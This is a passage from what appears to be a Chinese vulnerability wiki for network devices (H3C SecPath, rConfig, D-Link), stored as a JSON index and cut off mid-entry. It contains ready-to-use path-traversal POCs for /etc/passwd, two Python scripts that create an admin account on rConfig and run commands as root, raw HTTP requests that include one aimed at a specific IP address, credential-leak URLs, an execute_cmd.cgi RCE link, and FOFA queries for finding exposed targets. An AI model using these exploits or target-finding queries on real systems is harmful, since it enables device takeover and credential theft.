任意文件下载漏洞","keywords":"","body":"H3C SecPath 下一代防火墙 任意文件下载漏洞 漏洞描述 H3C SecPath 下一代防火墙 存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息 漏洞影响 [!NOTE] H3C SecPath FOFA [!NOTE] title=\"Web user login\" 漏洞复现 登录页面如下 存在漏洞点的功能有两个 点击下载抓包更改请求 并且在未身份验证的情况中，也可以请求下载敏感文件 验证POC /webui/?g=sys_dia_data_check&file_name=../../etc/passwd /webui/? g=sys_capture_file_download&name=../../../../../../../../etc/passwd ​ 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/rConfig/":{"url":"book/网络设备漏洞/rConfig/","title":"rConfig","keywords":"","body":"rConfig类似- rConfig useradmin.inc.php 信息泄露漏洞 rConfig userprocess.php 任意用户创建漏洞 rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞 rConfig ajaxEditTemplate.php 后台远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/rConfig/rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞.html":{"url":"book/网络设备漏洞/rConfig/rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞.html","title":"rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞","keywords":"","body":"rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞 漏洞描述 rConfig ajaxArchiveFiles.php文件中由于对path参数和ext参数进行命令拼接，导致攻击者可以远程命令执行获取服务器权限 漏洞影响 [!NOTE] rConfig FOFA [!NOTE] app=\"rConfig\" 漏洞复现 存在漏洞的文件为 /home/rconfig/www/lib/ajaxHandlers/ajaxArchiveFiles.php logged_in) { echo 'Don\\'t bother trying to hack me!!!!! This hack attempt has been logged'; $log->Warn(\"Security Issue: Some tried to access this file directly from IP: \" . $_SERVER['REMOTE_ADDR'] . \" & Username: \" . $session->username . \" (File: \" . $_SERVER['PHP_SELF'] . \")\"); // need to add authentication to this script header(\"Location: \" . $config_basedir . \"login.php\"); } else { //archive logs files $mainPath = $_GET['path']; $archiveMainPath = $mainPath . \"archive/\"; $ext = \"*.\" . $_GET['ext']; $fullpath = $mainPath . $ext; // create and archive dir if not already created if (!is_dir($archiveMainPath)) { mkdir(\"$archiveMainPath\"); } $today = date(\"Ymd\"); $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; exec($commandString); foreach (glob($fullpath) as $v) { unlink($v); } $fileCount = count(glob($mainPath . $ext)); if ($fileCount > 0) { $response = json_encode(array( 'failure' => true )); } else { $response = json_encode(array( 'success' => true )); } echo $response; } // end session check 关键代码如下 $mainPath = $_GET['path']; $archiveMainPath = $mainPath . \"archive/\"; $ext = \"*.\" . $_GET['ext']; $fullpath = $mainPath . $ext; // create and archive dir if not already created if (!is_dir($archiveMainPath)) { mkdir(\"$archiveMainPath\"); } $today = date(\"Ymd\"); $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; exec($commandString); $mainPath参数和$ext参数 用户可控 $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; 没有使用过滤直接拼接命令，导致命令执行，并因为sudo而root权限执行，由于是后台漏洞所以需要登录，配合任意用户创建可以RCE 请求包为 GET /lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;ls%3E../../test.txt HTTP/1.1 Host: Cookie: cookname=testtest; cookid=a13be657db5e18e453c66c564467b0f2; PHPSESSID=lr7j5r2beat1eprpklrhiorq71 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 2 再请求 http://xxx.xxx.xxx.xxx/test.txt 验证漏洞 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: rConfig userprocess.php 任意用户创建漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'testtest{}'.format(ran_number), 'password': 'testtest@{}'.format(ran_number), 'passconf': 'testtest@{}'.format(ran_number), 'email': 'testtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'test'} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: username = 'testtest{}'.format(ran_number) password = 'testtest@{}'.format(ran_number) print(\"\\033[36m[o] 成功创建账户 testtest{}/testtest@{} \\033[0m\".format(ran_number, ran_number)) POC_2(target_url, username, password) else: print(\"\\033[31m[x] 创建失败:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, username, password): print(\"\\033[36m[o] 正在登陆账户..... \\033[0m\") vuln_url = target_url + \"/lib/crud/userprocess.php\" headers = { 'Content-Type': \"application/x-www-form-urlencoded; charset=UTF-8\", \"Referer\": target_url + \"deviceConnTemplates.php\", \"Origin\": target_url, \"X-Requested-With\": \"XMLHttpRequest\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = { 'user': username, 'pass': password, 'sublogin': '1' } try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在尝试执行 cat /etc/passwd.....\\033[0m\") with requests.Session() as s: p = s.post(target_url + '/lib/crud/userprocess.php', data=data, verify=False) if \"Stephen Stack\" in p.text: print(\"\\033[31m[x] 登录失败 \\033[0m\") else: rce = s.get(target_url + '/lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;cat%20/etc/passwd%3E../../test.txt', verify=False, headers=headers) if \"success\" in rce.text: response = s.get(target_url + '/test.txt', verify=False) print(\"\\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/rConfig/rConfig userprocess.php 任意用户创建漏洞.html":{"url":"book/网络设备漏洞/rConfig/rConfig userprocess.php 任意用户创建漏洞.html","title":"rConfig userprocess.php 任意用户创建漏洞","keywords":"","body":"rConfig userprocess.php 任意用户创建漏洞 漏洞描述 rConfig userprocess.php 存在任意用户创建漏洞，发送特定的请求包攻击者可以创建管理员账户登录后台 漏洞影响 [!NOTE] rConfig FOFA [!NOTE] app=\"rConfig\" 漏洞复现 出现漏洞的文件为 userproce.php procLogin(); } /* Admin submitted user add form */ else if (isset($_POST['add']) && isset($_POST['editid']) && empty($_POST['editid'])) { $this->procRegister(); } /* Admin submitted user edit form */ else if (isset($_POST['add']) && isset($_POST['editid']) && !empty($_POST['editid'])) { $this->procUpdateAccount(); } /* User submitted forgot password form */ else if (isset($_POST['subforgot'])) { $this->procForgotPass(); } /* User submitted edit account form */ else if (isset($_POST['subedit'])) { $this->procEditAccount(); } /** * The only other reason user should be directed here * is if he wants to logout, which means user is * logged in currently. */ else if ($session->logged_in) { $this->procLogout(); } /** * Should not get here, which means user is viewing this page * by mistake and therefore is redirected. */ else { header(\"Location: /login.php\"); } } /** * procLogin - Processes the user submitted login form, if errors * are found, the user is redirected to correct the information, * if not, the user is effectively logged in to the system. */ function procLogin() { global $session, $form; /* Login attempt */ $retval = $session->login($_POST['user'], $_POST['pass'], isset($_POST['remember'])); /* Login successful */ if ($retval) { header(\"Location: \" . $session->referrer); } /* Login failed */ else { $_SESSION['value_array'] = $_POST; $_SESSION['error_array'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer); } } /** * procLogout - Simply attempts to log the user out of the system * given that there is no logout form to process. */ function procLogout() { global $session; $retval = $session->logout(); header(\"Location: /login.php\"); } /** * procRegister - Processes the user submitted registration form, * if errors are found, the user is redirected to correct the * information, if not, the user is effectively registered with * the system and an email is (optionally) sent to the newly * created user. */ function procRegister() { global $session, $form; /* Convert username to all lowercase (by option) */ if (ALL_LOWERCASE) { $_POST['username'] = strtolower($_POST['username']); } /* Registration attempt */ $retval = $session->register($_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Registration Successful */ if ($retval == 0) { $_SESSION['reguname'] = $_POST['username']; $_SESSION['regsuccess'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully added to Database\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['reguname'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be added to Database\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } } /** * procForgotPass - Validates the given username then if * everything is fine, a new password is generated and * emailed to the address the user gave on sign up. */ function procForgotPass() { global $database, $session, $mailer, $form; /* Username error checking */ $subuser = $_POST['user']; $field = \"user\"; //Use field name for username if (!$subuser || strlen($subuser = trim($subuser)) == 0) { $form->setError($field, \"Username not entered\"); $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } else { /* Make sure username is in database */ $subuser = stripslashes($subuser); if (strlen($subuser) 30 || !preg_match(\"/^([0-9a-z])+$/\", $subuser) || (!$database->usernameTaken($subuser))) { $form->setError($field, \"Unknown Username\"); $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } } /* Errors exist, have user correct them */ if ($form->num_errors > 0) { $_SESSION['value_array'] = $_POST; $_SESSION['error_array'] = $form->getErrorArray(); } else { /* Generate new password */ $newpass = $session->generateRandStr(8); /* Get email of user */ $usrinf = $database->getUserInfo($subuser); $email = $usrinf['email']; /* Attempt to send the email with new password */ if ($mailer->sendNewPass($subuser, $email, $newpass)) { /* Email sent, update database */ $database->updateUserField($subuser, \"password\", md5($newpass)); echo \"\" . \"alert('Your new password has been generated. The password was emailed to $email');\" . \"window.close();\" . \"\"; }/* Email failure, do not change password */ else { $_SESSION['forgotpass'] = false; } } } /** * procEditAccount - Attempts to edit the user's account * information, including the password, which must be verified * before a change is made. */ function procEditAccount() { global $session, $form; /* Account edit attempt */ $retval = $session->editAccount($_POST['editid'], $_POST['username'], $_POST['curpass'], $_POST['newpass'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Account edit successful */ if ($retval == 0) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['useredit'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } } /** * procEditAccount - Attempts to edit the user's account * information, including the password, which must be verified * before a change is made. */ function procUpdateAccount() { // http or https check for url Protocol $protocol = 'http'; if (isset($_SERVER['HTTPS'])) { if (strtoupper($_SERVER['HTTPS']) == 'ON') { $protocol = 'https'; } } global $session, $form; /* Account edit attempt */ $retval = $session->updateAccount($_POST['editid'], $_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Account edit successful */ if ($retval == 0) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['useredit'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php\"); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php\"); } } } /* Initialize process */ $process = new Process; 出现漏洞的原因是对权限设定错误，任何人都可以通过访问这个文件创建管理员用户 发送如下请求包创建管理员用户 testtest，密码为 testtest@123 POST /lib/crud/userprocess.php HTTP/1.1 Host: 194.149.41.11 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: multipart/form-data; boundary=b1467349fcce4aa0ae8d44439f4e06bc Upgrade-Insecure-Requests: 1 Referer: http://194.149.41.11/useradmin.php Origin: http://194.149.41.11/ Cookie: PHPSESSID=test Content-Length: 697 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"username\" testtest --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"password\" testtest@123 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"passconf\" testtest@123 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"email\" testtest@test.com --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"ulevelid\" 9 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"add\" add --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"editid\" --b1467349fcce4aa0ae8d44439f4e06bc-- 成功创建用户 testtest，以管理员身份登录后台 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: rConfig userprocess.php 任意用户创建漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'testtest{}'.format(ran_number), 'password': 'testtest@{}'.format(ran_number), 'passconf': 'testtest@{}'.format(ran_number), 'email': 'testtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'testtest{}'.format(ran_number)} print(\"\\033[36m[o] 正在创建账户..... \\033[0m\".format(ran_number, ran_number)) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: print(\"\\033[36m[o] 成功创建账户 testtest{}/testtest@{} \\033[0m\".format(ran_number, ran_number)) else: print(\"\\033[31m[x] 创建失败:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/rConfig/rConfig ajaxEditTemplate.php 后台远程命令执行.html":{"url":"book/网络设备漏洞/rConfig/rConfig ajaxEditTemplate.php 后台远程命令执行.html","title":"rConfig ajaxEditTemplate.php 后台远程命令执行","keywords":"","body":"rConfig ajaxEditTemplate.php 后台远程命令执行 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/网络设备漏洞/rConfig/rConfig useradmin.inc.php 信息泄露漏洞.html":{"url":"book/网络设备漏洞/rConfig/rConfig useradmin.inc.php 信息泄露漏洞.html","title":"rConfig useradmin.inc.php 信息泄露漏洞","keywords":"","body":"rConfig useradmin.inc.php 信息泄露漏洞 漏洞描述 rConfig useradmin.inc.php 存在信息泄露漏洞，通过访问文件获取用户邮箱信息和登录名 漏洞影响 [!NOTE] rConfig FOFA [!NOTE] app=\"rConfig\" 漏洞复现 出现漏洞的文件 query(\"SELECT timeZone FROM settings\"); $result = $db2->resultsetCols(); $timeZone = $result[0]; date_default_timezone_set($timeZone); /* Get Row count from users where NOT deleted */ $db2->query('SELECT COUNT(*) AS total FROM users WHERE status = 1'); $row = $db2->resultsetCols(); $result[\"total\"] = $row[0]; /* Instantiate Paginator Class */ $pages = new Paginator; $pages->items_total = $result['total']; $pages->mid_range = 7; // Number of pages to display. Must be odd and > 3 $pages->paginate(); echo $pages->display_pages(); echo \"\" . $pages->display_jump_menu() . $pages->display_items_per_page() . \"\"; /* GET all nodes records from DB */ $db2->query(\"SELECT id, username, userlevel, email, timestamp FROM users WHERE status = 1 $pages->limit\"); $resultSelect = $db2->resultset(); // push rows to $itesm array $items = array(); foreach ($resultSelect as $row) { array_push($items, $row); } /* Create Multidimensional array for use later */ $result[\"rows\"] = $items; $i = 0; # row counter to enable alternate row coloring ?> Username E-mail User Level Last Login '; ?> \"/> display_pages(); echo \"\"; echo \"Page: $pages->current_page of $pages->num_pages\\n\"; 文件没有设定权限，任何人可以访问泄露信息 漏洞验证的Url为 /useradmin.inc.php 泄露用户信息 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/D-Link/":{"url":"book/网络设备漏洞/D-Link/","title":"D-Link","keywords":"","body":"D-Link D-Link AC管理系统默认账号密码 D-Link Dir-645 getcfg.php 账号密码泄露漏洞 CVE-2019-17506 D-Link DSL-28881A FTP配置错误 CVE-2020-24578 D-Link DSL-28881A 未授权访问 CVE-2020-24579 D-Link DSL-28881A 信息泄露 CVE-2020-24577 D-Link DSL-28881A 远程命令执行 CVE-2020-24581 D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078 D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/D-Link/D-Link AC管理系统默认账号密码.html":{"url":"book/网络设备漏洞/D-Link/D-Link AC管理系统默认账号密码.html","title":"D-Link AC管理系统默认账号密码","keywords":"","body":"D-Link AC管理系统默认账号密码 漏洞描述 D-Link AC管理系统存在默认账号密码，可被获取敏感信息 漏洞影响 [!NOTE] D-Link AC管理系统 FOFA [!NOTE] \"AC集中管理平台\" && body=\"D-Link路由器管理页\" 漏洞复现 默认口令为 admin:admin Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 D_Link_AC_Centralized_management_system__Default_weak_password.json 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/D-Link/D-Link Dir-645 getcfg.php 账号密码泄露漏洞 CVE-2019-17506.html":{"url":"book/网络设备漏洞/D-Link/D-Link Dir-645 getcfg.php 账号密码泄露漏洞 CVE-2019-17506.html","title":"D-Link Dir-645 getcfg.php 账号密码泄露漏洞 CVE-2019-17506","keywords":"","body":"D-Link Dir-645 getcfg.php 账号密码泄露漏洞 CVE-2019-17506 漏洞描述 D-Link DIR-868L B1-2.03和DIR-817LW A1-1.04路由器上有一些不需要身份验证的Web界面。攻击者可以通过SERVICES的DEVICE.ACCOUNT值以及AUTHORIZED_GROUP = 1％0a来获取getcfg.php的路由器的用户名和密码（以及其他信息）。这可用于远程控制路由器 漏洞影响 [!NOTE] D-Link Dir 系列多个版本 FOFA [!NOTE] app=\"D_Link-DIR-868L\" 漏洞复现 登录页面如下 发送如下请求包 POST /getcfg.php HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Content-Length: 61 SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1 获取到路由器账号密码即可登录后台 Goby & POC 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/D-Link/D-Link DSL-28881A 信息泄露 CVE-2020-24577.html":{"url":"book/网络设备漏洞/D-Link/D-Link DSL-28881A 信息泄露 CVE-2020-24577.html","title":"D-Link DSL-28881A 信息泄露 CVE-2020-24577","keywords":"","body":"D-Link DSL-28881A 信息泄露 CVE-2020-24577 漏洞描述 通过物理连接或无线访问建立与网络的连接后，恶意用户可以通过直接浏览以下URL来获取纯文本格式的Internet提供商连接用户名和密码，以及无线路由器的纯文本格式的用户名和密码 漏洞影响 [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" 漏洞复现 登录页面输入任意密码建立连接 跳转到 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail 显示密码错误 访问下列两个连接 http://xxx.xxx.xxx.xxx:8008/tmp/cfg/lib_cfg_cfgcmd http://xxx.xxx.xxx.xxx:8008/tmp/.nvram [!NOTE] 连接Wifl或物理连接Wifi才能访问 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/D-Link/D-Link DSL-28881A FTP配置错误 CVE-2020-24578.html":{"url":"book/网络设备漏洞/D-Link/D-Link DSL-28881A FTP配置错误 CVE-2020-24578.html","title":"D-Link DSL-28881A FTP配置错误 CVE-2020-24578","keywords":"","body":"D-Link DSL-28881A FTP配置错误 CVE-2020-24578 漏洞描述 D-Link DSL-2888A路由器具有文件共享功能，该功能允许用户通过将外部驱动器插入路由器来与其他网络用户共享文件。然后通过FTP（文件传输协议）共享。但是，FTP服务允许网络用户转义共享文件夹以访问路由器文件系统并下载位于根文件夹中的其他文件。 漏洞影响 [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" 漏洞复现 前提为使用 D-Link DSL-28881A 信息泄露 CVE-2020-24577 获取FTP凭证 以下提供了下载“ passwd”的示例： 在FTP客户端上使用以下命令以有效的凭据（从Finding-2获得）连接到FTP服务。 使用以下命令导航到根文件夹。 ftp xxx.xxx.xxx.xxx ftp> cd etc ftp> get passwd 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/D-Link/D-Link DSL-28881A 未授权访问 CVE-2020-24579.html":{"url":"book/网络设备漏洞/D-Link/D-Link DSL-28881A 未授权访问 CVE-2020-24579.html","title":"D-Link DSL-28881A 未授权访问 CVE-2020-24579","keywords":"","body":"D-Link DSL-28881A 未授权访问 CVE-2020-24579 漏洞描述 路由器Web门户的身份验证不足，无法访问任何经过身份验证的管理页面，而无需输入正确的密码。位于同一网络上的恶意用户可以使用无效的凭据直接浏览到任何经过身份验证的管理页面。 漏洞影响 [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" 漏洞复现 登录页面输入任意密码建立连接 跳转到 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail 显示密码错误 再请求URL http://xxx.xxx.xxx.xxx/WiFi.shtml 未授权访问后台 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/D-Link/D-Link DSL-28881A 远程命令执行 CVE-2020-24581.html":{"url":"book/网络设备漏洞/D-Link/D-Link DSL-28881A 远程命令执行 CVE-2020-24581.html","title":"D-Link DSL-28881A 远程命令执行 CVE-2020-24581","keywords":"","body":"D-Link DSL-28881A 远程命令执行 CVE-2020-24581 漏洞描述 D-Link DSL-2888A AU_2.31_V1.1.47ae55之前版本存在安全漏洞，该漏洞源于包含一个execute cmd.cgi特性(不能通过web用户界面访问)，该特性允许经过身份验证的用户执行操作系统命令。 在该版本固件中同时存在着一个不安全认证漏洞（CVE-2020-24580），在登录界面输入任意密码就可以成功访问路由器界面。 漏洞影响 [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" 漏洞复现 登录页面输入任意密码建立连接 跳转到 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail 显示密码错误 漏洞出现在 execute_cmd.cgi 文件中 #!/bin/sh . /usr/syscfg/api_log.sh cmd=`echo ${QUERY_STRING} | cut -d = -f 3` cmd=`echo ${cmd} | tr \"%20\" \" \"` result=`${cmd}` TGP_Log ${TGP_LOG_WARNING} \"cmd=${cmd}, result=${result}\" echo \"Content-type: text/html\" echo \"\" echo -n ${result} 这里取出 ${QUERY_STRING} 中的第二个参数值，然后去除空格命令执行 在这个过程中并没有过滤，看一下参数从哪来的 文件 /www/js/ajax.js get : function(_dataType) { var _url = this.url; if(_url.indexOf('?') == -1) _url += '?timestamp=' + new Date().getTime(); else _url += \"&timestamp=\" + new Date().getTime(); if(this.queryString.length > 0) _url += \"&\" + this.queryString; this.xmlHttp.open(\"GET\", _url, true); /* will make IE11 fail. if(!document.all){ if(_dataType == \"xml\") this.xmlHttp.overrideMimeType(\"text/xml;charset=utf8\"); else this.xmlHttp.overrideMimeType(\"text/html;charset=gb2312\");//设定以gb2312编码识别数据 } */ this.xmlHttp.send(null); }, 看一下过程 ┌──(root)-[/tmp] └─# echo \"timestamp=1589333279490&cmd=whoami\" | cut -d = -f 3 whoami 这里取第二个参数 whoami 然后就没有过滤的执行了 所以EXP为: http://xxx.xxx.xxx.xxx/cgi-bin/execute_cmd.cgi?timestamp=test&cmd=whoami 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/D-Link/D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078.html":{"url":"book/网络设备漏洞/D-Link/D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078.html","title":"D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078","keywords":"","body":"D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078 漏洞描述 D-Link DCS系列监控 通过访问特定的URL得到账号密码信息，攻击者通过漏洞进入后台可以获取视频监控页面 漏洞影响 [!NOTE] DCS-2530L DCS-2670L DCS-4603 DCS-4622 DCS-4701E DCS-4703E DCS-4705E DCS-4802E DCS-P703 FOFA [!NOTE] app=\"D_Link-DCS-2530L\" 漏洞复现 访问登录页面如下 出现漏洞的 Url 为, 其中泄露了账号密码 http://xxx.xxx.xxx.xxx/config/getuser?index=0 使用泄露的账号密码登陆系统 Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 D_Link_DC_Disclosure_of_account_password_information 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/D-Link/D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞.html":{"url":"book/网络设备漏洞/D-Link/D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞.html","title":"D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞","keywords":"","body":"D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞 漏洞描述 D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器 漏洞影响 [!NOTE] D-Link ShareCenter DNS-320 